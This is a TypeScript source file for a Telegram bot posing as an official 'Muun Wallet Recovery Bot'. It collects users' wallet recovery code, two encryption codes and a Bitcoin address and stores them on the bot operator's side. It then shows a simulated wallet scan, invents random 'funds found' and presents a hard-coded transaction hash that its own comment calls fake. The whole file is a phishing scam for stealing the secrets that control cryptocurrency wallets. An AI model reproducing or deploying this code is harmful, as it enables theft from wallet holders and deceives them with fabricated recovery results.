import TelegramBot from 'node-telegram-bot-api';
import { config } from 'dotenv';
import { validateRecoveryCode, validateBitcoinAddress } from '../client/src/lib/validation';

// Load environment variables
config();

// User session states for multi-step conversation
interface UserSession {
  chatId: number;
  currentStep: 'initial' | 'waitingForRecoveryCode' | 'waitingForEncryptionCode1' | 'waitingForEncryptionCode2' | 'waitingForBitcoinAddress' | 'processing';
  recoveryCode?: string;
  encryptionCode1?: string;
  encryptionCode2?: string;
  bitcoinAddress?: string;
}

// Store user sessions
const userSessions = new Map<number, UserSession>();

// Bot instance
let bot: TelegramBot | null = null;

// Initialize the bot
export function initBot() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    console.error('TELEGRAM_BOT_TOKEN is not defined in the environment variables');
    return null;
  }

  try {
    // Create a bot that uses 'polling' to fetch new updates
    bot = new TelegramBot(token, { polling: true });
    console.log('✅ Telegram bot initialized successfully');

    // Handle /start command
    bot.onText(/\/start/, (msg) => {
      const chatId = msg.chat.id;
      initializeUserSession(chatId);
      sendWelcomeMessage(chatId);
    });

    // Handle /help command
    bot.onText(/\/help/, (msg) => {
      const chatId = msg.chat.id;
      sendHelpMessage(chatId);
    });

    // Handle /cancel command
    bot.onText(/\/cancel/, (msg) => {
      const chatId = msg.chat.id;
      if (userSessions.has(chatId)) {
        userSessions.delete(chatId);
        bot?.sendMessage(chatId, "Current recovery process has been cancelled. Type /start to begin a new recovery.");
      } else {
        bot?.sendMessage(chatId, "No active recovery process to cancel. Type /start to begin a recovery.");
      }
    });

    // Handle /status command
    bot.onText(/\/status/, (msg) => {
      const chatId = msg.chat.id;
      const session = userSessions.get(chatId);
      
      if (!session) {
        bot?.sendMessage(chatId, "No active recovery process. Type /start to begin.");
        return;
      }
      
      let statusMessage = "Current Recovery Status:\n\n";
      statusMessage += `Step: ${getStepDescription(session.currentStep)}\n`;
      
      if (session.recoveryCode) {
        statusMessage += `✅ Recovery Code: ${maskCode(session.recoveryCode)}\n`;
      }
      
      if (session.encryptionCode1) {
        statusMessage += `✅ First Encryption Code: ${maskCode(session.encryptionCode1)}\n`;
      }
      
      if (session.encryptionCode2) {
        statusMessage += `✅ Second Encryption Code: ${maskCode(session.encryptionCode2)}\n`;
      }
      
      if (session.bitcoinAddress) {
        statusMessage += `✅ Bitcoin Address: ${maskAddress(session.bitcoinAddress)}\n`;
      }
      
      bot?.sendMessage(chatId, statusMessage);
    });

    // Handle text messages (for the recovery flow)
    bot.on('message', (msg) => {
      if (!msg.text || msg.text.startsWith('/')) return; // Skip commands
      
      const chatId = msg.chat.id;
      const session = userSessions.get(chatId);
      
      if (!session) {
        bot?.sendMessage(chatId, "Please type /start to begin the recovery process.");
        return;
      }
      
      handleUserInput(chatId, msg.text, session);
    });

    return bot;
  } catch (error) {
    console.error('Error initializing Telegram bot:', error);
    return null;
  }
}

// Initialize a new user session
function initializeUserSession(chatId: number) {
  userSessions.set(chatId, {
    chatId,
    currentStep: 'initial'
  });
}

// Send welcome message with instructions
function sendWelcomeMessage(chatId: number) {
  const welcomeMessage = 
    "Welcome to the Muun Wallet Recovery Bot 🔐\n\n" +
    "I'll help you recover your funds by guiding you through a step-by-step process.\n\n" +
    "Here's what you'll need to provide:\n" +
    "1. Your Recovery Code\n" +
    "2. First Encryption Code\n" +
    "3. Second Encryption Code\n" +
    "4. Bitcoin Address (where you want your funds sent)\n\n" +
    "Let's get started! Please provide your Recovery Code.";
  
  bot?.sendMessage(chatId, welcomeMessage);
  
  // Update user session
  const session = userSessions.get(chatId);
  if (session) {
    session.currentStep = 'waitingForRecoveryCode';
    userSessions.set(chatId, session);
  }
}

// Send help message
function sendHelpMessage(chatId: number) {
  const helpMessage = 
    "📋 Muun Wallet Recovery Bot - Help\n\n" +
    "Available commands:\n" +
    "/start - Begin the recovery process\n" +
    "/cancel - Cancel the current recovery process\n" +
    "/status - Check your current recovery status\n" +
    "/help - Show this help message\n\n" +
    "Recovery Process Steps:\n" +
    "1. Enter your Recovery Code (format: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX)\n" +
    "2. Enter your First Encryption Code\n" +
    "3. Enter your Second Encryption Code\n" +
    "4. Enter your Bitcoin Address (where you want your funds sent)\n\n" +
    "If you need assistance, please contact our support team at support@muun.com";
  
  bot?.sendMessage(chatId, helpMessage);
}

// Handle user input based on the current step
function handleUserInput(chatId: number, text: string, session: UserSession) {
  switch(session.currentStep) {
    case 'waitingForRecoveryCode':
      handleRecoveryCodeInput(chatId, text, session);
      break;
    case 'waitingForEncryptionCode1':
      handleEncryptionCode1Input(chatId, text, session);
      break;
    case 'waitingForEncryptionCode2':
      handleEncryptionCode2Input(chatId, text, session);
      break;
    case 'waitingForBitcoinAddress':
      handleBitcoinAddressInput(chatId, text, session);
      break;
    default:
      bot?.sendMessage(chatId, "Sorry, I'm not sure what you're trying to do. Type /start to begin the recovery process or /help for assistance.");
  }
}

// Handle recovery code input
function handleRecoveryCodeInput(chatId: number, text: string, session: UserSession) {
  // Clean up input (remove extra spaces, etc.)
  const recoveryCode = text.trim();
  
  // Validate recovery code format
  if (!validateRecoveryCode(recoveryCode)) {
    bot?.sendMessage(
      chatId, 
      "Invalid recovery code format. Please enter a valid recovery code.\n\nExample format: XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX-XXXX"
    );
    return;
  }
  
  // Update session
  session.recoveryCode = recoveryCode;
  session.currentStep = 'waitingForEncryptionCode1';
  userSessions.set(chatId, session);
  
  // Ask for encryption code 1
  bot?.sendMessage(
    chatId, 
    "Great! I've received your recovery code.\n\nNow, please provide your first encryption code:"
  );
}

// Handle first encryption code input
function handleEncryptionCode1Input(chatId: number, text: string, session: UserSession) {
  const encryptionCode = text.trim();
  
  // Basic validation for encryption code
  if (encryptionCode.length < 6) {
    bot?.sendMessage(
      chatId, 
      "The encryption code seems too short. Please check and enter your first encryption code again:"
    );
    return;
  }
  
  // Update session
  session.encryptionCode1 = encryptionCode;
  session.currentStep = 'waitingForEncryptionCode2';
  userSessions.set(chatId, session);
  
  // Ask for encryption code 2
  bot?.sendMessage(
    chatId, 
    "Received your first encryption code.\n\nNow, please provide your second encryption code:"
  );
}

// Handle second encryption code input
function handleEncryptionCode2Input(chatId: number, text: string, session: UserSession) {
  const encryptionCode = text.trim();
  
  // Basic validation for encryption code
  if (encryptionCode.length < 6) {
    bot?.sendMessage(
      chatId, 
      "The encryption code seems too short. Please check and enter your second encryption code again:"
    );
    return;
  }
  
  // Update session
  session.encryptionCode2 = encryptionCode;
  session.currentStep = 'waitingForBitcoinAddress';
  userSessions.set(chatId, session);
  
  // Ask for Bitcoin address
  bot?.sendMessage(
    chatId, 
    "Received your second encryption code.\n\nFinally, please provide the Bitcoin address where you want your funds sent:"
  );
}

// Handle Bitcoin address input
function handleBitcoinAddressInput(chatId: number, text: string, session: UserSession) {
  const bitcoinAddress = text.trim();
  
  // Validate Bitcoin address
  if (!validateBitcoinAddress(bitcoinAddress)) {
    bot?.sendMessage(
      chatId, 
      "Invalid Bitcoin address format. Please enter a valid Bitcoin address.\n\nIt should start with 1, 3, or bc1."
    );
    return;
  }
  
  // Update session
  session.bitcoinAddress = bitcoinAddress;
  session.currentStep = 'processing';
  userSessions.set(chatId, session);
  
  // Start the recovery process
  startRecoveryProcess(chatId, session);
}

// Start the wallet scanning and recovery process
async function startRecoveryProcess(chatId: number, session: UserSession) {
  try {
    // Send initial confirmation
    bot?.sendMessage(
      chatId,
      "🔄 Recovery process started!\n\nWe're now scanning wallets to find your funds. This may take a few minutes..."
    );
    
    // Simulate wallet scanning process
    let walletsScanned = 0;
    const totalWallets = 20000;
    let satoshisFound: number | null = null;
    let recoveryCompleted = false;
    
    // Send initial progress message
    const progressMsg = await bot?.sendMessage(
      chatId,
      `Scanning wallets: 0/${totalWallets} (0%)`
    );
    
    // If we have a message ID, we'll update it periodically
    if (progressMsg && progressMsg.message_id) {
      const messageId = progressMsg.message_id;
      
      // Simulate the scanning process with updates
      const scanInterval = setInterval(async () => {
        // Increase the count by a random amount
        walletsScanned += Math.floor(Math.random() * 500) + 200;
        
        // Calculate progress percentage
        const progressPercent = Math.min(Math.floor((walletsScanned / totalWallets) * 100), 100);
        
        // If we're at 80% and haven't found satoshis yet, simulate finding them
        if (progressPercent >= 80 && !satoshisFound) {
          satoshisFound = Math.floor(Math.random() * 1000000) + 500000; // 0.5 to 1.5 BTC in sats
          
          // Send a message about finding funds
          await bot?.sendMessage(
            chatId,
            `💰 Funds found!\n\nWe've discovered ${formatNumber(satoshisFound)} satoshis (${(satoshisFound / 100000000).toFixed(8)} BTC) in the wallets we scanned.\n\nPreparing transaction...`
          );
        }
        
        // Update the progress message
        await bot?.editMessageText(
          `Scanning wallets: ${formatNumber(walletsScanned)}/${formatNumber(totalWallets)} (${progressPercent}%)`,
          { chat_id: chatId, message_id: messageId }
        );
        
        // If we're done scanning, clear the interval and send completion
        if (walletsScanned >= totalWallets || (satoshisFound && walletsScanned > totalWallets * 0.9)) {
          clearInterval(scanInterval);
          recoveryCompleted = true;
          
          // Generate a fake transaction hash
          const txHash = "b5d7c5e9f60f1a30f1a6dc9fef5e05ca9d4d90fa6988f3c6bc7e68449ca58cb3";
          
          // Send completion message
          await bot?.sendMessage(
            chatId,
            `✅ Recovery completed!\n\n${satoshisFound ? `Found ${formatNumber(satoshisFound)} satoshis (${(satoshisFound / 100000000).toFixed(8)} BTC)` : 'No funds were found in the scanned wallets.'}\n\n${satoshisFound ? `Transaction sent! Your funds are on the way to your Bitcoin address.\n\nTransaction hash:\n${txHash}\n\nYou can view this transaction at:\nhttps://mempool.space/tx/${txHash}` : ''}`
          );
          
          // Clear user session
          userSessions.delete(chatId);
        }
      }, 2000); // Update every 2 seconds
    }
  } catch (error) {
    console.error('Error in recovery process:', error);
    bot?.sendMessage(
      chatId,
      "❌ There was an error processing your recovery request. Please try again by typing /start or contact our support team."
    );
  }
}

// Helper function to get a human-readable step description
function getStepDescription(step: UserSession['currentStep']) {
  switch(step) {
    case 'initial':
      return 'Starting recovery process';
    case 'waitingForRecoveryCode':
      return 'Waiting for Recovery Code';
    case 'waitingForEncryptionCode1':
      return 'Waiting for First Encryption Code';
    case 'waitingForEncryptionCode2':
      return 'Waiting for Second Encryption Code';
    case 'waitingForBitcoinAddress':
      return 'Waiting for Bitcoin Address';
    case 'processing':
      return 'Processing recovery';
    default:
      return 'Unknown step';
  }
}

// Helper function to mask sensitive data
function maskCode(code: string): string {
  if (code.length <= 8) return '********';
  return code.substring(0, 4) + '...' + code.substring(code.length - 4);
}

// Helper function to mask Bitcoin address
function maskAddress(address: string): string {
  if (address.length <= 10) return address;
  return address.substring(0, 6) + '...' + address.substring(address.length - 6);
}

// Helper function to format numbers with commas
function formatNumber(num: number): string {
  return new Intl.NumberFormat().format(num);
}

// Export the bot instance getter
export function getBot() {
  return bot;
}